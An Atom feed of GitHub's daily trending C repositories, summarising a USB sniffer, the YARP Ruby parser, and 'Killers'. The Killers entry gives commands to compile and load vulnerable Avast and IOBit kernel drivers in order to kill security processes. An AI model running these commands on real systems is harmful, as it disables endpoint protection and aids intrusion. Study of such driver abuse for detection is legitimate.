<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub C Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-06-16T01:31:31Z</updated>
  <subtitle>Daily Trending of C in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>ataradov/usb-sniffer</title>
    <updated>2023-06-16T01:31:31Z</updated>
    <id>tag:github.com,2023-06-16:/ataradov/usb-sniffer</id>
    <link href="https://github.com/ataradov/usb-sniffer" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Low-cost LS/FS/HS USB sniffer with Wireshark interface&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Low-cost USB Sniffer (LS/FS/HS) with Wireshark interface&lt;/h1&gt; &#xA;&lt;p&gt;This sniffer can be used standalone from a command line or as a plugin for &lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt; with direct control from the UI.&lt;/p&gt; &#xA;&lt;p&gt;Either way, the capture is saved in a standard &lt;a href=&#34;https://pcapng.com/&#34;&gt;PcapNG&lt;/a&gt; format.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/doc/wireshark.png&#34; alt=&#34;Wireshark UI&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Here are some example capture files:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/doc/usb_ls_mouse.pcapng&#34;&gt;Mouse (Low-Speed)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/doc/usb_fs_vcp.pcapng&#34;&gt;Virtual COM-Port Adapter (Full-Speed)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/doc/usb_hs_flash_drive.pcapng&#34;&gt;USB Flash Drive (High-Speed)&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Note: You will need a recent version of Wireshark (v4.x.x). Older versions may not be able to decode USB payload, but should still show the raw data.&lt;/p&gt; &#xA;&lt;h2&gt;Hardware&lt;/h2&gt; &#xA;&lt;p&gt;The sniffer is based around Cypress CY7C68013A MCU, Lattice LCMXO2 FPGA, and Microchip USB3343 USB PHY.&lt;/p&gt; &#xA;&lt;p&gt;Prices and availability of ICs vary, but the total BOM should be less than $50.&lt;/p&gt; &#xA;&lt;p&gt;LCMXO2-2000HC speed grades 5 and 6 were tested and the provided JED file was built for the speed grade 5, so it should work for both. Speed grade 4 should work too, but they are the least available and the price difference is negligible.&lt;/p&gt; &#xA;&lt;p&gt;Caution: Do not buy CY7C68013A from eBay or AliExpress, they all are either fake or sketchy in some way. This IC can be quite expensive from regular suppliers, but &lt;a href=&#34;https://www.lcsc.com/&#34;&gt;LCSC&lt;/a&gt; is a legitimate supplier and they often have it at much cheaper prices.&lt;/p&gt; &#xA;&lt;p&gt;PCBs can be ordered from &lt;a href=&#34;https://oshpark.com/shared_projects/avWPFMNs&#34;&gt;OSH Park&lt;/a&gt; or any other PCB manufacturer, &lt;a href=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/bin/usb-sniffer-gerbers.zip&#34;&gt;gerber files&lt;/a&gt; are provided.&lt;/p&gt; &#xA;&lt;p&gt;There are also STL files for the case.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/doc/pcb.jpg&#34; alt=&#34;Bare PCB&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/doc/case.jpg&#34; alt=&#34;3D Printed Case&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Hardware bring up&lt;/h2&gt; &#xA;&lt;p&gt;This hardware does not require external programmers, both MCU and FPGA are programmed using a USB interface.&lt;/p&gt; &#xA;&lt;p&gt;When a board with a blank EEPROM is connected, it would enumerate as an unconfigured FX2LP device.&lt;/p&gt; &#xA;&lt;p&gt;Note: on Windows blank FX2LP will enumerate as an unknown USB device. Use supplied dummy &lt;a href=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/bin/blank_fx2lp.inf&#34;&gt;INF file&lt;/a&gt; as a driver. It will associate blank FX2LP device with a generic WinUSB driver, so it would be recognized by the tools. Once the firmware runs, it would supply necessary descripptors automatically.&lt;/p&gt; &#xA;&lt;p&gt;The first step is to load the firmware into the MCU SRAM:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./usb_sniffer --mcu-sram usb_sniffer.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The device would reset and enumerate as a USB Sniffer with a dummy serial number. After that, program the EEPROM:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./usb_sniffer --mcu-eeprom usb_sniffer.bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;After resetting or power cycling, the device would enumerate as a USB Sniffer with a real serial number. The serial number is derived from the FPGA unique identifier, so if this step succeeds, it means that FPGA is also functional.&lt;/p&gt; &#xA;&lt;p&gt;After that program the FPGA flash:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./usb_sniffer --fpga-flash usb_sniffer_impl.jed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;MCU EEPROM can be reprogrammed at any time as long as it is running valid firmware.&lt;/p&gt; &#xA;&lt;p&gt;In case the firmware gets corrupted, it is possible to run the MCU in the unconfigured mode by shorting BOOT and VCC test points (located near the EEPROM IC on the board) and resetting the device. You would need to repeat both steps for programming the MCU firmware to recover it to the working state.&lt;/p&gt; &#xA;&lt;p&gt;The functionality and performance of the MCU and FPGA connection can be tested using the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./usb_sniffer --test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You should be getting 40-50 MB/s. If the speed is significantly slower, connect the sniffer directly into the root USB port without intermediate hubs.&lt;/p&gt; &#xA;&lt;p&gt;It is a good idea to run this test after each work session.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;p&gt;Pre-built binaries are provided for &lt;a href=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/bin/usb_sniffer_linux&#34;&gt;Linux&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/ataradov/usb-sniffer/main/usb_sniffer_win.exe&#34;&gt;Windows&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To use with Wireshark, copy the file into the extcap plugin directory: &lt;code&gt;~/.config/wireshark/extcap&lt;/code&gt; on Linux, and &lt;code&gt;C:/Users/&amp;lt;user&amp;gt;/AppData/Roaming/Wireshark/extcap/&lt;/code&gt; on Windows.&lt;/p&gt; &#xA;&lt;p&gt;For Linux, make sure that the binary file has an executable attribute set.&lt;/p&gt; &#xA;&lt;p&gt;After that, refresh the list of interfaced in Wireshark and you should see &#34;USB Sniffer&#34; as one of the interfaces. Configure capture settings and start/stop the capture as with any other interface.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>xalicex/Killers</title>
    <updated>2023-06-16T01:31:31Z</updated>
    <id>tag:github.com,2023-06-16:/xalicex/Killers</id>
    <link href="https://github.com/xalicex/Killers" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Exploitation of process killer drivers&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Killers&lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://github.com/xalicex/Killers/raw/main/killers.jpg&#34; width=&#34;40%&#34; height=&#34;40%&#34;&gt; &lt;/p&gt; &#xA;&lt;h2&gt;Avast&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.loldrivers.io/drivers/57fc510a-e649-4599-b83e-8f3605e3d1d9/&#34;&gt;https://www.loldrivers.io/drivers/57fc510a-e649-4599-b83e-8f3605e3d1d9/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;x86_64-w64-mingw32-gcc -o avast_killer.exe avast_killer.c &#xA;sc.exe create aswArPot.sys binPath= C:\windows\temp\aswArPot.bin type= kernel &amp;amp;&amp;amp; sc.exe start aswArPot.sys&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;IOBit Malware Fighter&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.loldrivers.io/drivers/fe2f68e1-e459-4802-9a9a-23bb3c2fd331&#34;&gt;https://www.loldrivers.io/drivers/fe2f68e1-e459-4802-9a9a-23bb3c2fd331&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;x86_64-w64-mingw32-gcc -o iobit_malwarefighter_killer.exe iobit_malwarefighter_killer.c &#xA;sc.exe create kEvP64.sys binPath= C:\windows\temp\kEvP64.bin type= kernel &amp;amp;&amp;amp; sc.exe start kEvP64.sys&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>ruby/yarp</title>
    <updated>2023-06-16T01:31:31Z</updated>
    <id>tag:github.com,2023-06-16:/ruby/yarp</id>
    <link href="https://github.com/ruby/yarp" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Yet Another Ruby Parser&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Yet Another Ruby Parser&lt;/h1&gt; &#xA;&lt;p&gt;This is a parser for the Ruby programming language. It is designed to be portable, error tolerant, and maintainable. It is written in C99 and has no dependencies. It is currently being integrated into &lt;a href=&#34;https://github.com/ruby/ruby&#34;&gt;CRuby&lt;/a&gt;, &lt;a href=&#34;https://github.com/jruby/jruby&#34;&gt;JRuby&lt;/a&gt;, &lt;a href=&#34;https://github.com/oracle/truffleruby&#34;&gt;TruffleRuby&lt;/a&gt;, &lt;a href=&#34;https://github.com/sorbet/sorbet&#34;&gt;Sorbet&lt;/a&gt;, and &lt;a href=&#34;https://github.com/ruby-syntax-tree/syntax_tree&#34;&gt;Syntax Tree&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;The repository contains the infrastructure for both a shared library (librubyparser) and a native CRuby extension. The shared library has no bindings to CRuby itself, and so can be used by other projects. The native CRuby extension links against &lt;code&gt;ruby.h&lt;/code&gt;, and so is suitable in the context of CRuby.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;.&#xA;├── Makefile.in           configuration to compile the shared library and native tests&#xA;├── Rakefile              configuration to compile the native extension and run the Ruby tests&#xA;├── bin&#xA;│&amp;nbsp;&amp;nbsp; ├── lex               runs the lexer on a file or string, prints the tokens, and compares to ripper&#xA;│&amp;nbsp;&amp;nbsp; └── parse             runs the parser on a file or string and prints the syntax tree&#xA;├── config.yml            specification for tokens and nodes in the tree&#xA;├── configure.ac          configuration to generate the Makefile&#xA;├── docs                  documentation about the project&#xA;├── exe&#xA;│&amp;nbsp;&amp;nbsp; └── yarp-lsp          language server protocol executable&#xA;├── ext&#xA;│&amp;nbsp;&amp;nbsp; └── yarp&#xA;│&amp;nbsp;&amp;nbsp;     ├── extconf.rb    configuration to generate the Makefile for the native extension&#xA;│&amp;nbsp;&amp;nbsp;     └── extension.c   the native extension that interacts with librubyparser&#xA;├── include&#xA;│&amp;nbsp;&amp;nbsp; ├── yarp              header files for the shared library&#xA;│&amp;nbsp;&amp;nbsp; └── yarp.h            main header file for the shared library&#xA;├── java                  Java bindings for the shared library&#xA;├── lib&#xA;│&amp;nbsp;&amp;nbsp; ├── yarp              Ruby library files&#xA;│&amp;nbsp;&amp;nbsp; └── yarp.rb           main entrypoint for the Ruby library&#xA;├── src&#xA;│&amp;nbsp;&amp;nbsp; ├── enc               various encoding files&#xA;│&amp;nbsp;&amp;nbsp; ├── util              various utility files&#xA;│&amp;nbsp;&amp;nbsp; └── yarp.c            main entrypoint for the shared library&#xA;├── tasks                 various Rake tasks for the project&#xA;├── templates             contains ERB templates generated by templates/template.rb&#xA;│&amp;nbsp;&amp;nbsp; └── template.rb       generates code from the nodes and tokens configured by config.yml&#xA;├── test&#xA;│&amp;nbsp;&amp;nbsp; ├── fixtures          Ruby code used for testing&#xA;│&amp;nbsp;&amp;nbsp; └── snapshots         snapshots of generated syntax trees corresponding to fixtures&#xA;└── vscode                VSCode extension&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;p&gt;To compile the shared library, you will need:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A C99 compiler&lt;/li&gt; &#xA; &lt;li&gt;autotools (autoconf, automake, libtool)&lt;/li&gt; &#xA; &lt;li&gt;make&lt;/li&gt; &#xA; &lt;li&gt;Ruby 3.3.0-preview1 or later&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Once you have these dependencies, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bundle install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;to fetch the Ruby dependencies. Finally, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;rake compile&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;to compile the shared library. It will be built in the &lt;code&gt;build&lt;/code&gt; directory. To test that everything is working, run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;bin/parse -e &#34;1 + 2&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;to see the syntax tree for the expression &lt;code&gt;1 + 2&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/CONTRIBUTING.md&#34;&gt;CONTRIBUTING.md&lt;/a&gt; file for more information. We additionally have documentation about the overall design of the project as well as various subtopics.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/design.md&#34;&gt;Design&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/encoding.md&#34;&gt;Encoding&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/extension.md&#34;&gt;Extension&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/heredocs.md&#34;&gt;Heredocs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/mapping.md&#34;&gt;Mapping&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/ripper.md&#34;&gt;Ripper&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/serialization.md&#34;&gt;Serialization&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/docs/testing.md&#34;&gt;Testing&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;VSCode plugin&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://raw.githubusercontent.com/ruby/yarp/main/vscode/README.md&#34;&gt;vscode/README.md&lt;/a&gt; file for more information and installation instructions.&lt;/p&gt;</summary>
  </entry>
</feed>